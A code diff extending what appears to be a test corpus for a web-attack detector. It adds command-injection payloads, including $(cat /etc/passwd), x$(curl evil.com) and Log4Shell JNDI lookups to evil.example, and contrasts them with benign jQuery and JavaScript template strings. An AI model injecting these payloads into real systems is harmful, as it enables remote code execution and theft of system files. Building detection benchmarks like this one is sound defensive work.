@@ -106,6 +106,16 @@ _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
     "the control case the new pins are symmetric with"
 )
 
+_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON = (
+    "a bare single-token $(...)/${...} substitution is deliberately "
+    "context-gated to query_param/url_path so it stays detected there "
+    "(the jQuery $(id) selector and JS ${var} template shapes are legitimate "
+    "in a request body but not as a raw query-string or path segment value); "
+    "the round-robin delivery mechanism in this benchmark can assign either "
+    "of those contexts to a jQuery/JS-template benign case, which is expected "
+    "given that design and not a regression"
+)
+
 MALICIOUS_CORPUS: list[MaliciousCase] = [
     MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
     MaliciousCase(
@@ -908,6 +918,51 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "cmd_injection",
         "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
     ),
+    MaliciousCase("cmd_dollar_paren_bare_whoami", "cmd_injection", "$(whoami)"),
+    MaliciousCase(
+        "cmd_dollar_paren_bare_cat_passwd", "cmd_injection", "$(cat /etc/passwd)"
+    ),
+    MaliciousCase(
+        "cmd_dollar_paren_glued_prefix_curl_evil_com",
+        "cmd_injection",
+        "x$(curl evil.com)",
+    ),
+    MaliciousCase(
+        "cmd_dollar_paren_glued_wrapped_whoami",
+        "cmd_injection",
+        "foo$(whoami)bar",
+    ),
+    MaliciousCase("cmd_dollar_brace_bare_ifs", "cmd_injection", "${IFS}"),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_ldap",
+        "cmd_injection",
+        "${jndi:ldap://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_rmi",
+        "cmd_injection",
+        "${jndi:rmi://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_direct_jndi_dns",
+        "cmd_injection",
+        "${jndi:dns://evil.example/a}",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_lower_bare", "cmd_injection", "${lower:j}ndi"
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_default_value_bare",
+        "cmd_injection",
+        "${::-j}ndi",
+    ),
+    MaliciousCase(
+        "cmd_log4shell_obfuscated_nested_full_exploit",
+        "cmd_injection",
+        "${${lower:j}ndi:ldap://evil.example/a}",
+    ),
+    MaliciousCase("cmd_denylist_glued_nmap", "cmd_injection", "x`nmap`"),
+    MaliciousCase("cmd_denylist_glued_powershell", "cmd_injection", "x`powershell`"),
 ]
 
 BENIGN_CORPUS: list[BenignCase] = [
@@ -1918,10 +1973,26 @@ BENIGN_CORPUS: list[BenignCase] = [
         "cmd_injection_glued_plausible_token_ref_user_list",
         "ref`user`list",
     ),
+    BenignCase(
+        "cmd_injection_jquery_selector_bare_id_call",
+        "$(id).addClass('active');",
+    ),
+    BenignCase(
+        "cmd_injection_jquery_selector_hash_id_call",
+        "$('#submit-button').on('click', handleSubmit);",
+    ),
+    BenignCase(
+        "cmd_injection_js_template_dotted_prop",
+        "const label = `Welcome ${obj.prop}`;",
+    ),
+    BenignCase(
+        "cmd_injection_js_template_bare_var_brace",
+        "const path = `/users/${id}`;",
+    ),
 ]
 
 BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
-    "cmd_injection": 32,
+    "cmd_injection": 45,
     "cms_probing": 10,
     "code_injection": 3,
     "dir_traversal": 8,
@@ -1940,7 +2011,7 @@ BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
     "xml": 4,
     "xss": 14,
 }
-BASELINE_MALICIOUS_DETECTED_TOTAL = 197
+BASELINE_MALICIOUS_DETECTED_TOTAL = 210
 
 BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {"cmd_injection": 9}
 BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 9
